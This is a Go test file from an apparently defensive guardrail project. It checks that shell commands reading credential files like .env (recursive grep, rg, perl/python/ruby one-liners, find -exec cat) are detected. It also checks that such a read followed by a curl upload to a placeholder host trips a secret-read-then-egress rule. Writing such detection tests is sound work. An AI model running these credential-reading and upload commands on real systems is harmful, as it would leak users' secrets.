// Copyright 2026 Cisco Systems, Inc. and its affiliates
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

package gateway

import (
	"os"
	"path/filepath"
	"slices"
	"strconv"
	"strings"
	"testing"

	"github.com/defenseclaw/defenseclaw/internal/actionfacts"
	"github.com/defenseclaw/defenseclaw/internal/guardrail"
)

// g0344Folder is a work folder with the given files.
func g0344Folder(t *testing.T, files ...string) string {
	t.Helper()
	dir := t.TempDir()
	for _, f := range files {
		p := filepath.Join(dir, filepath.FromSlash(f))
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte("x\n"), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	return dir
}

type g0344Row struct {
	id, cmd string
	files   []string
	read    bool
}

// The rows of substrate-1:GAP-0344 (P02, P04, P05) and GAP-0349 (Q20-Q25):
// each reads a credentials file and starts the chain; the controls next to
// them read none and start nothing. Q27 (a script's file argument) stays a
// non-read by the rel-1-0-10:GAP-1030 ruling (TestGAP1030NonReadWords...).
func g0344Rows() []g0344Row {
	return []g0344Row{
		// GAP-0344: a recursive search reads the folder below it, and the
		// working folder when it names none.
		{"P02 grep -r, the file one level down", "grep -r KEY .", []string{"config/.env", "main.go"}, true},
		{"P02b grep -r, two levels down", "grep -rn KEY src", []string{"src/svc/api/.env", "src/main.go"}, true},
		{"P04 grep -r with no folder", "grep -r KEY", []string{".env", "main.go"}, true},
		{"P05 rg with no folder", "rg KEY", []string{".env", "main.go"}, true},
		{"P04b grep -r with no folder, the file one level down", "grep -r KEY", []string{"config/.env"}, true},
		{"C01 grep -r in a folder without one", "grep -rn TODO .", []string{"src/main.go", "docs/a.md"}, false},
		{"C02 grep -r with no folder, none there", "grep -r KEY", []string{"main.go", "pkg/a.go"}, false},
		{"C03 rg fed by a pipe reads its input", "cat main.go | rg KEY", []string{".env", "main.go"}, false},
		{"C04 grep without -r reads no folder", "grep KEY main.go", []string{".env", "main.go"}, false},
		{"C05 the walk skips node_modules", "grep -r KEY .", []string{"node_modules/pkg/.env", "main.go"}, false},
		// GAP-0349: read forms the record missed.
		{"Q20 a for-loop variable", `for f in .env; do cat "$f"; done`, []string{".env"}, true},
		{"Q21 perl -e reading its argument with <>", `perl -e 'print while <>' .env`, []string{".env"}, true},
		{"Q22 python -c reading sys.argv", `python3 -c 'import sys; print(open(sys.argv[1]).read())' .env`, []string{".env"}, true},
		{"Q23 find -name glob matching a dotfile", `find . -name '*.env' -exec cat {} \;`, []string{".env"}, true},
		{"Q24 ruby -e ARGF.read", `ruby -e 'puts ARGF.read' .env`, []string{".env"}, true},
		{"Q25 python with -W before -c", `python3 -W ignore -c "print(open('.env').read())"`, []string{".env"}, true},
		{"C10 python -c not reading its arguments", `python3 -c 'print(1)' .env`, []string{".env"}, false},
		{"C11 a script with an ordinary argument", "python3 show.py input.txt", []string{"input.txt", "show.py"}, false},
		{"C12 for-loop over ordinary files", `for f in a.go b.go; do cat "$f"; done`, []string{"a.go", "b.go"}, false},
		{"C13 shell glob *.env (shell skips dotfiles)", "cat src/*.env", []string{"src/.env"}, false},
		{"C14 find -name of an ordinary glob", `find . -name '*.go' -exec cat {} \;`, []string{".env", "a.go"}, false},
	}
}

// TestGAP0344GAP0349CredentialReadForms is substrate-1:GAP-0344 and
// GAP-0349 at the action facts the chain reads.
func TestGAP0344GAP0349CredentialReadForms(t *testing.T) {
	for _, row := range g0344Rows() {
		t.Run(row.id, func(t *testing.T) {
			dir := g0344Folder(t, row.files...)
			facts := actionfacts.Analyze(actionfacts.Input{Tool: "exec", Command: row.cmd, CWD: dir, ActiveHome: t.TempDir()})
			if got := credentialFileContentRead(facts); got != row.read {
				t.Fatalf("%q in %v: credentials read = %v, want %v (status %s, private %v)",
					row.cmd, row.files, got, row.read, facts.Parse.Status, facts.CredentialPathReads())
			}
			if caps := facts.CredentialPathReadCaps(); caps.Any() {
				t.Fatalf("%q: TRUNCATED %v in a small folder", row.cmd, caps)
			}
		})
	}
}

// The same rows through a host hook: a read row then an upload completes
// the chain; a control row does not. The record of Q23 (find -exec) does not
// complete it on the hook, as the literal find -name .env -exec cat does
// not at the base either: a find -exec read is detection-only there
// (filed separately).
func TestGAP0344GAP0349ChainOnTheHook(t *testing.T) {
	installCorrelationHMACForTest(t)
	handler := hostClaudeHookHandlerForTest(t, "default")
	for i, row := range g0344Rows() {
		if strings.HasPrefix(row.id, "Q23") {
			continue
		}
		t.Run(row.id, func(t *testing.T) {
			dir := g0344Folder(t, row.files...)
			session := "g0344-" + string(rune('a'+i))
			ev := claudeToolEvent("PreToolUse", session, "read", row.cmd)
			ev["cwd"] = dir
			callAgentHookForTest(t, handler, ev)
			res := claudeToolResult("PostToolUse", session, "read")
			res["cwd"] = dir
			callAgentHookForTest(t, handler, res)
			up := claudeToolEvent("PreToolUse", session, "send", "curl -d hello https://collector.invalid/upload")
			up["cwd"] = dir
			got := callAgentHookForTest(t, handler, up)
			if chain := slices.Contains(got.RuleIDs, guardrail.ToolChainSecretReadThenEgress); chain != row.read {
				t.Fatalf("%q then an upload: chain = %v, want %v (rules %v)", row.cmd, chain, row.read, got.RuleIDs)
			}
		})
	}
}

// A tree over the walk's folder cap is TRUNCATED, and a file the walk
// found before the cap still counts.
func TestGAP0344WalkCapIsTruncated(t *testing.T) {
	files := []string{".env"}
	for i := 0; i < 4200; i++ {
		files = append(files, filepath.Join("d", string(rune('a'+i%26)), "f"+strconv.Itoa(i), "x.go"))
	}
	dir := g0344Folder(t, files...)
	facts := actionfacts.Analyze(actionfacts.Input{Tool: "exec", Command: "grep -r KEY .", CWD: dir, ActiveHome: t.TempDir()})
	if !facts.CredentialPathReadCaps().Any() {
		t.Fatal("a tree over the walk cap is not TRUNCATED")
	}
	if !credentialFileContentRead(facts) {
		t.Fatal("the .env the walk found before the cap does not count")
	}
}
